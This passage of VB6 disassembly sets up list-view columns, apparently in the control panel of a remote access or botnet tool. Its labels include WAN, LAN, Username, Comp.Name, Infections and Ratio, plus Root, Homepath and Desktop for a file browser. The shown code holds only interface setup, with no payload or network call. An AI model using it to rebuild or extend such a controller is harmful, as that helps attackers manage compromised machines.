0086B7AB: movsd 
0086B7AC: movsd 
0086B7AD: push 00000010h
0086B7AF: pop eax
0086B7B0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B7B5: lea esi, var_5C
0086B7B8: mov edi, esp
0086B7BA: movsd 
0086B7BB: movsd 
0086B7BC: movsd 
0086B7BD: movsd 
0086B7BE: push 00000010h
0086B7C0: pop eax
0086B7C1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B7C6: lea esi, var_7C
0086B7C9: mov edi, esp
0086B7CB: movsd 
0086B7CC: movsd 
0086B7CD: movsd 
0086B7CE: movsd 
0086B7CF: push 00000010h
0086B7D1: pop eax
0086B7D2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B7D7: lea esi, var_0000009C
0086B7DD: mov edi, esp
0086B7DF: movsd 
0086B7E0: movsd 
0086B7E1: movsd 
0086B7E2: movsd 
0086B7E3: push 00000004h
0086B7E5: push 00000002h
0086B7E7: push 00445534h
0086B7EC: push 00000000h
0086B7EE: push 00000019h
0086B7F0: mov eax, [ebp+08h]
0086B7F3: mov eax, [eax]
0086B7F5: push [ebp+08h]
0086B7F8: call [eax+00000320h]
0086B7FE: push eax
0086B7FF: lea eax, var_18
0086B802: push eax
0086B803: call 00410A84h ; Set (object)
0086B808: push eax
0086B809: lea eax, var_2C
0086B80C: push eax
0086B80D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B812: add esp, 00000010h
0086B815: push eax
0086B816: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B81B: push eax
0086B81C: lea eax, var_1C
0086B81F: push eax
0086B820: call 00410A84h ; Set (object)
0086B825: push eax
0086B826: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086B82B: add esp, 0000004Ch
0086B82E: lea eax, var_1C
0086B831: push eax
0086B832: lea eax, var_18
0086B835: push eax
0086B836: push 00000002h
0086B838: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086B83D: add esp, 0000000Ch
0086B840: lea ecx, var_2C
0086B843: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086B848: mov var_34, 80020004h
0086B84F: mov var_3C, 0000000Ah
0086B856: mov var_54, 80020004h
0086B85D: mov var_5C, 0000000Ah
0086B864: mov var_74, 00446720h ; WAN
0086B86B: mov var_7C, 00000008h
0086B872: mov var_00000094, 00000708h
0086B87C: mov var_0000009C, 00000002h
0086B886: push 00000010h
0086B888: pop eax
0086B889: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B88E: lea esi, var_3C
0086B891: mov edi, esp
0086B893: movsd 
0086B894: movsd 
0086B895: movsd 
0086B896: movsd 
0086B897: push 00000010h
0086B899: pop eax
0086B89A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B89F: lea esi, var_5C
0086B8A2: mov edi, esp
0086B8A4: movsd 
0086B8A5: movsd 
0086B8A6: movsd 
0086B8A7: movsd 
0086B8A8: push 00000010h
0086B8AA: pop eax
0086B8AB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B8B0: lea esi, var_7C
0086B8B3: mov edi, esp
0086B8B5: movsd 
0086B8B6: movsd 
0086B8B7: movsd 
0086B8B8: movsd 
0086B8B9: push 00000010h
0086B8BB: pop eax
0086B8BC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B8C1: lea esi, var_0000009C
0086B8C7: mov edi, esp
0086B8C9: movsd 
0086B8CA: movsd 
0086B8CB: movsd 
0086B8CC: movsd 
0086B8CD: push 00000004h
0086B8CF: push 00000002h
0086B8D1: push 00445534h
0086B8D6: push 00000000h
0086B8D8: push 00000019h
0086B8DA: mov eax, [ebp+08h]
0086B8DD: mov eax, [eax]
0086B8DF: push [ebp+08h]
0086B8E2: call [eax+00000320h]
0086B8E8: push eax
0086B8E9: lea eax, var_18
0086B8EC: push eax
0086B8ED: call 00410A84h ; Set (object)
0086B8F2: push eax
0086B8F3: lea eax, var_2C
0086B8F6: push eax
0086B8F7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B8FC: add esp, 00000010h
0086B8FF: push eax
0086B900: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B905: push eax
0086B906: lea eax, var_1C
0086B909: push eax
0086B90A: call 00410A84h ; Set (object)
0086B90F: push eax
0086B910: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086B915: add esp, 0000004Ch
0086B918: lea eax, var_1C
0086B91B: push eax
0086B91C: lea eax, var_18
0086B91F: push eax
0086B920: push 00000002h
0086B922: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086B927: add esp, 0000000Ch
0086B92A: lea ecx, var_2C
0086B92D: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086B932: mov var_34, 80020004h
0086B939: mov var_3C, 0000000Ah
0086B940: mov var_54, 80020004h
0086B947: mov var_5C, 0000000Ah
0086B94E: mov var_74, 0044672Ch ; LAN
0086B955: mov var_7C, 00000008h
0086B95C: mov var_00000094, 00000708h
0086B966: mov var_0000009C, 00000002h
0086B970: push 00000010h
0086B972: pop eax
0086B973: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B978: lea esi, var_3C
0086B97B: mov edi, esp
0086B97D: movsd 
0086B97E: movsd 
0086B97F: movsd 
0086B980: movsd 
0086B981: push 00000010h
0086B983: pop eax
0086B984: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B989: lea esi, var_5C
0086B98C: mov edi, esp
0086B98E: movsd 
0086B98F: movsd 
0086B990: movsd 
0086B991: movsd 
0086B992: push 00000010h
0086B994: pop eax
0086B995: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B99A: lea esi, var_7C
0086B99D: mov edi, esp
0086B99F: movsd 
0086B9A0: movsd 
0086B9A1: movsd 
0086B9A2: movsd 
0086B9A3: push 00000010h
0086B9A5: pop eax
0086B9A6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B9AB: lea esi, var_0000009C
0086B9B1: mov edi, esp
0086B9B3: movsd 
0086B9B4: movsd 
0086B9B5: movsd 
0086B9B6: movsd 
0086B9B7: push 00000004h
0086B9B9: push 00000002h
0086B9BB: push 00445534h
0086B9C0: push 00000000h
0086B9C2: push 00000019h
0086B9C4: mov eax, [ebp+08h]
0086B9C7: mov eax, [eax]
0086B9C9: push [ebp+08h]
0086B9CC: call [eax+00000320h]
0086B9D2: push eax
0086B9D3: lea eax, var_18
0086B9D6: push eax
0086B9D7: call 00410A84h ; Set (object)
0086B9DC: push eax
0086B9DD: lea eax, var_2C
0086B9E0: push eax
0086B9E1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B9E6: add esp, 00000010h
0086B9E9: push eax
0086B9EA: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B9EF: push eax
0086B9F0: lea eax, var_1C
0086B9F3: push eax
0086B9F4: call 00410A84h ; Set (object)
0086B9F9: push eax
0086B9FA: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086B9FF: add esp, 0000004Ch
0086BA02: lea eax, var_1C
0086BA05: push eax
0086BA06: lea eax, var_18
0086BA09: push eax
0086BA0A: push 00000002h
0086BA0C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086BA11: add esp, 0000000Ch
0086BA14: lea ecx, var_2C
0086BA17: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086BA1C: mov var_34, 80020004h
0086BA23: mov var_3C, 0000000Ah
0086BA2A: mov var_54, 80020004h
0086BA31: mov var_5C, 0000000Ah
0086BA38: mov var_74, 00446744h ; Username
0086BA3F: mov var_7C, 00000008h
0086BA46: mov var_00000094, 000005DCh
0086BA50: mov var_0000009C, 00000002h
0086BA5A: push 00000010h
0086BA5C: pop eax
0086BA5D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BA62: lea esi, var_3C
0086BA65: mov edi, esp
0086BA67: movsd 
0086BA68: movsd 
0086BA69: movsd 
0086BA6A: movsd 
0086BA6B: push 00000010h
0086BA6D: pop eax
0086BA6E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BA73: lea esi, var_5C
0086BA76: mov edi, esp
0086BA78: movsd 
0086BA79: movsd 
0086BA7A: movsd 
0086BA7B: movsd 
0086BA7C: push 00000010h
0086BA7E: pop eax
0086BA7F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BA84: lea esi, var_7C
0086BA87: mov edi, esp
0086BA89: movsd 
0086BA8A: movsd 
0086BA8B: movsd 
0086BA8C: movsd 
0086BA8D: push 00000010h
0086BA8F: pop eax
0086BA90: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BA95: lea esi, var_0000009C
0086BA9B: mov edi, esp
0086BA9D: movsd 
0086BA9E: movsd 
0086BA9F: movsd 
0086BAA0: movsd 
0086BAA1: push 00000004h
0086BAA3: push 00000002h
0086BAA5: push 00445534h
0086BAAA: push 00000000h
0086BAAC: push 00000019h
0086BAAE: mov eax, [ebp+08h]
0086BAB1: mov eax, [eax]
0086BAB3: push [ebp+08h]
0086BAB6: call [eax+00000320h]
0086BABC: push eax
0086BABD: lea eax, var_18
0086BAC0: push eax
0086BAC1: call 00410A84h ; Set (object)
0086BAC6: push eax
0086BAC7: lea eax, var_2C
0086BACA: push eax
0086BACB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086BAD0: add esp, 00000010h
0086BAD3: push eax
0086BAD4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086BAD9: push eax
0086BADA: lea eax, var_1C
0086BADD: push eax
0086BADE: call 00410A84h ; Set (object)
0086BAE3: push eax
0086BAE4: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086BAE9: add esp, 0000004Ch
0086BAEC: lea eax, var_1C
0086BAEF: push eax
0086BAF0: lea eax, var_18
0086BAF3: push eax
0086BAF4: push 00000002h
0086BAF6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086BAFB: add esp, 0000000Ch
0086BAFE: lea ecx, var_2C
0086BB01: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086BB06: mov var_34, 80020004h
0086BB0D: mov var_3C, 0000000Ah
0086BB14: mov var_54, 80020004h
0086BB1B: mov var_5C, 0000000Ah
0086BB22: mov var_74, 0044675Ch ; Comp.Name
0086BB29: mov var_7C, 00000008h
0086BB30: mov var_00000094, 000005DCh
0086BB3A: mov var_0000009C, 00000002h
0086BB44: push 00000010h
0086BB46: pop eax
0086BB47: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BB4C: lea esi, var_3C
0086BB4F: mov edi, esp
0086BB51: movsd 
0086BB52: movsd 
0086BB53: movsd 
0086BB54: movsd 
0086BB55: push 00000010h
0086BB57: pop eax
0086BB58: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BB5D: lea esi, var_5C
0086BB60: mov edi, esp
0086BB62: movsd 
0086BB63: movsd 
0086BB64: movsd 
0086BB65: movsd 
0086BB66: push 00000010h
0086BB68: pop eax
0086BB69: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BB6E: lea esi, var_7C
0086BB71: mov edi, esp
0086BB73: movsd 
0086BB74: movsd 
0086BB75: movsd 
0086BB76: movsd 
0086BB77: push 00000010h
0086BB79: pop eax
0086BB7A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BB7F: lea esi, var_0000009C
0086BB85: mov edi, esp
0086BB87: movsd 
0086BB88: movsd 
0086BB89: movsd 
0086BB8A: movsd 
0086BB8B: push 00000004h
0086BB8D: push 00000002h
0086BB8F: push 00445534h
0086BB94: push 00000000h
0086BB96: push 00000019h
0086BB98: mov eax, [ebp+08h]
0086BB9B: mov eax, [eax]
0086BB9D: push [ebp+08h]
0086BBA0: call [eax+00000320h]
0086BBA6: push eax
0086BBA7: lea eax, var_18
0086BBAA: push eax
0086BBAB: call 00410A84h ; Set (object)
0086BBB0: push eax
0086BBB1: lea eax, var_2C
0086BBB4: push eax
0086BBB5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086BBBA: add esp, 00000010h
0086BBBD: push eax
0086BBBE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086BBC3: push eax
0086BBC4: lea eax, var_1C
0086BBC7: push eax
0086BBC8: call 00410A84h ; Set (object)
0086BBCD: push eax
0086BBCE: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086BBD3: add esp, 0000004Ch
0086BBD6: lea eax, var_1C
0086BBD9: push eax
0086BBDA: lea eax, var_18
0086BBDD: push eax
0086BBDE: push 00000002h
0086BBE0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086BBE5: add esp, 0000000Ch
0086BBE8: lea ecx, var_2C
0086BBEB: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086BBF0: mov var_34, 80020004h
0086BBF7: mov var_3C, 0000000Ah
0086BBFE: mov var_54, 80020004h
0086BC05: mov var_5C, 0000000Ah
0086BC0C: mov var_74, 004570A4h ; Infections
0086BC13: mov var_7C, 00000008h
0086BC1A: mov var_00000094, 000004B0h
0086BC24: mov var_0000009C, 00000002h
0086BC2E: push 00000010h
0086BC30: pop eax
0086BC31: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BC36: lea esi, var_3C
0086BC39: mov edi, esp
0086BC3B: movsd 
0086BC3C: movsd 
0086BC3D: movsd 
0086BC3E: movsd 
0086BC3F: push 00000010h
0086BC41: pop eax
0086BC42: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BC47: lea esi, var_5C
0086BC4A: mov edi, esp
0086BC4C: movsd 
0086BC4D: movsd 
0086BC4E: movsd 
0086BC4F: movsd 
0086BC50: push 00000010h
0086BC52: pop eax
0086BC53: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BC58: lea esi, var_7C
0086BC5B: mov edi, esp
0086BC5D: movsd 
0086BC5E: movsd 
0086BC5F: movsd 
0086BC60: movsd 
0086BC61: push 00000010h
0086BC63: pop eax
0086BC64: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BC69: lea esi, var_0000009C
0086BC6F: mov edi, esp
0086BC71: movsd 
0086BC72: movsd 
0086BC73: movsd 
0086BC74: movsd 
0086BC75: push 00000004h
0086BC77: push 00000002h
0086BC79: push 00445534h
0086BC7E: push 00000000h
0086BC80: push 00000019h
0086BC82: mov eax, [ebp+08h]
0086BC85: mov eax, [eax]
0086BC87: push [ebp+08h]
0086BC8A: call [eax+00000320h]
0086BC90: push eax
0086BC91: lea eax, var_18
0086BC94: push eax
0086BC95: call 00410A84h ; Set (object)
0086BC9A: push eax
0086BC9B: lea eax, var_2C
0086BC9E: push eax
0086BC9F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086BCA4: add esp, 00000010h
0086BCA7: push eax
0086BCA8: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086BCAD: push eax
0086BCAE: lea eax, var_1C
0086BCB1: push eax
0086BCB2: call 00410A84h ; Set (object)
0086BCB7: push eax
0086BCB8: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086BCBD: add esp, 0000004Ch
0086BCC0: lea eax, var_1C
0086BCC3: push eax
0086BCC4: lea eax, var_18
0086BCC7: push eax
0086BCC8: push 00000002h
0086BCCA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086BCCF: add esp, 0000000Ch
0086BCD2: lea ecx, var_2C
0086BCD5: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086BCDA: mov var_34, 80020004h
0086BCE1: mov var_3C, 0000000Ah
0086BCE8: mov var_54, 80020004h
0086BCEF: mov var_5C, 0000000Ah
0086BCF6: mov var_74, 004570C0h ; Total
0086BCFD: mov var_7C, 00000008h
0086BD04: mov var_00000094, 000004B0h
0086BD0E: mov var_0000009C, 00000002h
0086BD18: push 00000010h
0086BD1A: pop eax
0086BD1B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BD20: lea esi, var_3C
0086BD23: mov edi, esp
0086BD25: movsd 
0086BD26: movsd 
0086BD27: movsd 
0086BD28: movsd 
0086BD29: push 00000010h
0086BD2B: pop eax
0086BD2C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BD31: lea esi, var_5C
0086BD34: mov edi, esp
0086BD36: movsd 
0086BD37: movsd 
0086BD38: movsd 
0086BD39: movsd 
0086BD3A: push 00000010h
0086BD3C: pop eax
0086BD3D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BD42: lea esi, var_7C
0086BD45: mov edi, esp
0086BD47: movsd 
0086BD48: movsd 
0086BD49: movsd 
0086BD4A: movsd 
0086BD4B: push 00000010h
0086BD4D: pop eax
0086BD4E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BD53: lea esi, var_0000009C
0086BD59: mov edi, esp
0086BD5B: movsd 
0086BD5C: movsd 
0086BD5D: movsd 
0086BD5E: movsd 
0086BD5F: push 00000004h
0086BD61: push 00000002h
0086BD63: push 00445534h
0086BD68: push 00000000h
0086BD6A: push 00000019h
0086BD6C: mov eax, [ebp+08h]
0086BD6F: mov eax, [eax]
0086BD71: push [ebp+08h]
0086BD74: call [eax+00000320h]
0086BD7A: push eax
0086BD7B: lea eax, var_18
0086BD7E: push eax
0086BD7F: call 00410A84h ; Set (object)
0086BD84: push eax
0086BD85: lea eax, var_2C
0086BD88: push eax
0086BD89: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086BD8E: add esp, 00000010h
0086BD91: push eax
0086BD92: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086BD97: push eax
0086BD98: lea eax, var_1C
0086BD9B: push eax
0086BD9C: call 00410A84h ; Set (object)
0086BDA1: push eax
0086BDA2: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086BDA7: add esp, 0000004Ch
0086BDAA: lea eax, var_1C
0086BDAD: push eax
0086BDAE: lea eax, var_18
0086BDB1: push eax
0086BDB2: push 00000002h
0086BDB4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086BDB9: add esp, 0000000Ch
0086BDBC: lea ecx, var_2C
0086BDBF: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086BDC4: mov var_34, 80020004h
0086BDCB: mov var_3C, 0000000Ah
0086BDD2: mov var_54, 80020004h
0086BDD9: mov var_5C, 0000000Ah
0086BDE0: mov var_74, 004468A0h ; Status
0086BDE7: mov var_7C, 00000008h
0086BDEE: mov var_00000094, 000005DCh
0086BDF8: mov var_0000009C, 00000002h
0086BE02: push 00000010h
0086BE04: pop eax
0086BE05: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BE0A: lea esi, var_3C
0086BE0D: mov edi, esp
0086BE0F: movsd 
0086BE10: movsd 
0086BE11: movsd 
0086BE12: movsd 
0086BE13: push 00000010h
0086BE15: pop eax
0086BE16: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BE1B: lea esi, var_5C
0086BE1E: mov edi, esp
0086BE20: movsd 
0086BE21: movsd 
0086BE22: movsd 
0086BE23: movsd 
0086BE24: push 00000010h
0086BE26: pop eax
0086BE27: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BE2C: lea esi, var_7C
0086BE2F: mov edi, esp
0086BE31: movsd 
0086BE32: movsd 
0086BE33: movsd 
0086BE34: movsd 
0086BE35: push 00000010h
0086BE37: pop eax
0086BE38: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BE3D: lea esi, var_0000009C
0086BE43: mov edi, esp
0086BE45: movsd 
0086BE46: movsd 
0086BE47: movsd 
0086BE48: movsd 
0086BE49: push 00000004h
0086BE4B: push 00000002h
0086BE4D: push 00445534h
0086BE52: push 00000000h
0086BE54: push 00000019h
0086BE56: mov eax, [ebp+08h]
0086BE59: mov eax, [eax]
0086BE5B: push [ebp+08h]
0086BE5E: call [eax+00000320h]
0086BE64: push eax
0086BE65: lea eax, var_18
0086BE68: push eax
0086BE69: call 00410A84h ; Set (object)
0086BE6E: push eax
0086BE6F: lea eax, var_2C
0086BE72: push eax
0086BE73: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086BE78: add esp, 00000010h
0086BE7B: push eax
0086BE7C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086BE81: push eax
0086BE82: lea eax, var_1C
0086BE85: push eax
0086BE86: call 00410A84h ; Set (object)
0086BE8B: push eax
0086BE8C: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086BE91: add esp, 0000004Ch
0086BE94: lea eax, var_1C
0086BE97: push eax
0086BE98: lea eax, var_18
0086BE9B: push eax
0086BE9C: push 00000002h
0086BE9E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086BEA3: add esp, 0000000Ch
0086BEA6: lea ecx, var_2C
0086BEA9: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086BEAE: mov var_34, 80020004h
0086BEB5: mov var_3C, 0000000Ah
0086BEBC: mov var_54, 80020004h
0086BEC3: mov var_5C, 0000000Ah
0086BECA: mov var_74, 004570D0h ; Ratio
0086BED1: mov var_7C, 00000008h
0086BED8: mov var_00000094, 000004B0h
0086BEE2: mov var_0000009C, 00000002h
0086BEEC: push 00000010h
0086BEEE: pop eax
0086BEEF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BEF4: lea esi, var_3C
0086BEF7: mov edi, esp
0086BEF9: movsd 
0086BEFA: movsd 
0086BEFB: movsd 
0086BEFC: movsd 
0086BEFD: push 00000010h
0086BEFF: pop eax
0086BF00: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BF05: lea esi, var_5C
0086BF08: mov edi, esp
0086BF0A: movsd 
0086BF0B: movsd 
0086BF0C: movsd 
0086BF0D: movsd 
0086BF0E: push 00000010h
0086BF10: pop eax
0086BF11: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BF16: lea esi, var_7C
0086BF19: mov edi, esp
0086BF1B: movsd 
0086BF1C: movsd 
0086BF1D: movsd 
0086BF1E: movsd 
0086BF1F: push 00000010h
0086BF21: pop eax
0086BF22: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BF27: lea esi, var_0000009C
0086BF2D: mov edi, esp
0086BF2F: movsd 
0086BF30: movsd 
0086BF31: movsd 
0086BF32: movsd 
0086BF33: push 00000004h
0086BF35: push 00000002h
0086BF37: push 00445534h
0086BF3C: push 00000000h
0086BF3E: push 00000019h
0086BF40: mov eax, [ebp+08h]
0086BF43: mov eax, [eax]
0086BF45: push [ebp+08h]
0086BF48: call [eax+00000320h]
0086BF4E: push eax
0086BF4F: lea eax, var_18
0086BF52: push eax
0086BF53: call 00410A84h ; Set (object)
0086BF58: push eax
0086BF59: lea eax, var_2C
0086BF5C: push eax
0086BF5D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086BF62: add esp, 00000010h
0086BF65: push eax
0086BF66: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086BF6B: push eax
0086BF6C: lea eax, var_1C
0086BF6F: push eax
0086BF70: call 00410A84h ; Set (object)
0086BF75: push eax
0086BF76: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086BF7B: add esp, 0000004Ch
0086BF7E: lea eax, var_1C
0086BF81: push eax
0086BF82: lea eax, var_18
0086BF85: push eax
0086BF86: push 00000002h
0086BF88: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086BF8D: add esp, 0000000Ch
0086BF90: lea ecx, var_2C
0086BF93: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086BF98: mov var_34, 00447A84h
0086BF9F: mov var_3C, 00000008h
0086BFA6: push 00000010h
0086BFA8: pop eax
0086BFA9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BFAE: lea esi, var_3C
0086BFB1: mov edi, esp
0086BFB3: movsd 
0086BFB4: movsd 
0086BFB5: movsd 
0086BFB6: movsd 
0086BFB7: push 00000001h
0086BFB9: push 0000000Dh
0086BFBB: mov eax, [ebp+08h]
0086BFBE: mov eax, [eax]
0086BFC0: push [ebp+08h]
0086BFC3: call [eax+00000328h]
0086BFC9: push eax
0086BFCA: lea eax, var_18
0086BFCD: push eax
0086BFCE: call 00410A84h ; Set (object)
0086BFD3: push eax
0086BFD4: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086BFD9: add esp, 0000001Ch
0086BFDC: lea ecx, var_18
0086BFDF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086BFE4: mov var_34, 00455EECh ; KiB
0086BFEB: mov var_3C, 00000008h
0086BFF2: push 00000010h
0086BFF4: pop eax
0086BFF5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086BFFA: lea esi, var_3C
0086BFFD: mov edi, esp
0086BFFF: movsd 
0086C000: movsd 
0086C001: movsd 
0086C002: movsd 
0086C003: push 00000001h
0086C005: push 0000000Dh
0086C007: mov eax, [ebp+08h]
0086C00A: mov eax, [eax]
0086C00C: push [ebp+08h]
0086C00F: call [eax+00000328h]
0086C015: push eax
0086C016: lea eax, var_18
0086C019: push eax
0086C01A: call 00410A84h ; Set (object)
0086C01F: push eax
0086C020: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C025: add esp, 0000001Ch
0086C028: lea ecx, var_18
0086C02B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086C030: mov var_34, 00455EF8h ; MiB
0086C037: mov var_3C, 00000008h
0086C03E: push 00000010h
0086C040: pop eax
0086C041: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C046: lea esi, var_3C
0086C049: mov edi, esp
0086C04B: movsd 
0086C04C: movsd 
0086C04D: movsd 
0086C04E: movsd 
0086C04F: push 00000001h
0086C051: push 0000000Dh
0086C053: mov eax, [ebp+08h]
0086C056: mov eax, [eax]
0086C058: push [ebp+08h]
0086C05B: call [eax+00000328h]
0086C061: push eax
0086C062: lea eax, var_18
0086C065: push eax
0086C066: call 00410A84h ; Set (object)
0086C06B: push eax
0086C06C: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C071: add esp, 0000001Ch
0086C074: lea ecx, var_18
0086C077: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086C07C: mov var_34, 00455F04h ; GiB
0086C083: mov var_3C, 00000008h
0086C08A: push 00000010h
0086C08C: pop eax
0086C08D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C092: lea esi, var_3C
0086C095: mov edi, esp
0086C097: movsd 
0086C098: movsd 
0086C099: movsd 
0086C09A: movsd 
0086C09B: push 00000001h
0086C09D: push 0000000Dh
0086C09F: mov eax, [ebp+08h]
0086C0A2: mov eax, [eax]
0086C0A4: push [ebp+08h]
0086C0A7: call [eax+00000328h]
0086C0AD: push eax
0086C0AE: lea eax, var_18
0086C0B1: push eax
0086C0B2: call 00410A84h ; Set (object)
0086C0B7: push eax
0086C0B8: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C0BD: add esp, 0000001Ch
0086C0C0: lea ecx, var_18
0086C0C3: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086C0C8: mov var_34, 00455EECh ; KiB
0086C0CF: mov var_3C, 00000008h
0086C0D6: push 00000010h
0086C0D8: pop eax
0086C0D9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C0DE: lea esi, var_3C
0086C0E1: mov edi, esp
0086C0E3: movsd 
0086C0E4: movsd 
0086C0E5: movsd 
0086C0E6: movsd 
0086C0E7: push 00000000h
0086C0E9: mov eax, [ebp+08h]
0086C0EC: mov eax, [eax]
0086C0EE: push [ebp+08h]
0086C0F1: call [eax+00000328h]
0086C0F7: push eax
0086C0F8: lea eax, var_18
0086C0FB: push eax
0086C0FC: call 00410A84h ; Set (object)
0086C101: push eax
0086C102: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
0086C107: lea ecx, var_18
0086C10A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086C10F: mov var_34, 00455F94h ; Root
0086C116: mov var_3C, 00000008h
0086C11D: push 00000010h
0086C11F: pop eax
0086C120: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C125: lea esi, var_3C
0086C128: mov edi, esp
0086C12A: movsd 
0086C12B: movsd 
0086C12C: movsd 
0086C12D: movsd 
0086C12E: push 00000001h
0086C130: push 0000000Dh
0086C132: mov eax, [ebp+08h]
0086C135: mov eax, [eax]
0086C137: push [ebp+08h]
0086C13A: call [eax+0000032Ch]
0086C140: push eax
0086C141: lea eax, var_18
0086C144: push eax
0086C145: call 00410A84h ; Set (object)
0086C14A: push eax
0086C14B: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C150: add esp, 0000001Ch
0086C153: lea ecx, var_18
0086C156: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086C15B: mov var_34, 00455FA4h ; Homepath
0086C162: mov var_3C, 00000008h
0086C169: push 00000010h
0086C16B: pop eax
0086C16C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C171: lea esi, var_3C
0086C174: mov edi, esp
0086C176: movsd 
0086C177: movsd 
0086C178: movsd 
0086C179: movsd 
0086C17A: push 00000001h
0086C17C: push 0000000Dh
0086C17E: mov eax, [ebp+08h]
0086C181: mov eax, [eax]
0086C183: push [ebp+08h]
0086C186: call [eax+0000032Ch]
0086C18C: push eax
0086C18D: lea eax, var_18
0086C190: push eax
0086C191: call 00410A84h ; Set (object)
0086C196: push eax
0086C197: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C19C: add esp, 0000001Ch
0086C19F: lea ecx, var_18
0086C1A2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086C1A7: mov var_34, 00455FBCh ; Desktop
